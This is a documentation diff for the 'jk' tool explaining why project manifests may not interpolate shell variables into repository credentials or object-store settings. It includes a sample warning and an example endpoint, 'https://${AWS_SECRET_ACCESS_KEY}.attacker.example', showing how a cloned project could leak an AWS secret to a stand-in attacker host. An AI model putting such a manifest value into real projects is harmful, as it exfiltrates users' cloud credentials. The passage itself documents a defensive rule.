@@ -152,11 +152,22 @@ refused, the repository is accessed anonymously, and jk warns once per run:
 ```
 jk: warning: repository `internal` at https://attacker.example is accessed anonymously: its
 [repositories.internal] table interpolates ${AWS_SECRET_ACCESS_KEY}, and a project manifest may not
-read a variable of your shell into a credential — a cloned project could name any of them. To send
-one, declare [repositories.internal] with this URL and the ${VAR} reference in ~/.jk/config.toml,
+read a variable of your shell into a repository's credential or object-store keys — a cloned project
+could name any of them. To send one, declare [repositories.internal] with this URL and the ${VAR}
+reference in ~/.jk/config.toml,
 export JK_REPO_INTERNAL_TOKEN (or JK_REPO_INTERNAL_USERNAME + JK_REPO_INTERNAL_PASSWORD) with
 JK_REPO_INTERNAL_HOST=attacker.example, or run `jk repo login internal --url https://attacker.example/`.
 ```
+
+The rule covers every `${VAR}` a `[repositories.<id>]` table writes, not only `token` /
+`username` / `password`: an object-store repository's `access-key`, `secret-key` and
+`session-token`, and its `region` and `endpoint` too — a region rides the request signature in
+clear and an endpoint becomes a host name to resolve, so `endpoint =
+"https://${AWS_SECRET_ACCESS_KEY}.attacker.example"` would leak the value exactly as `secret-key`
+would. A refused object-store key is left unset (the transport falls back to the ambient AWS chain,
+or goes unsigned); the literal keys beside it stay. A `[repositories.<id>]` table in
+`~/.jk/config.toml` at the same origin supplies its own object-store keys instead, whatever the
+project wrote.
 
 A literal credential written into either file is that file's own secret and is used as written;
 committing one to a project is a leak of the project's secret, not of yours.
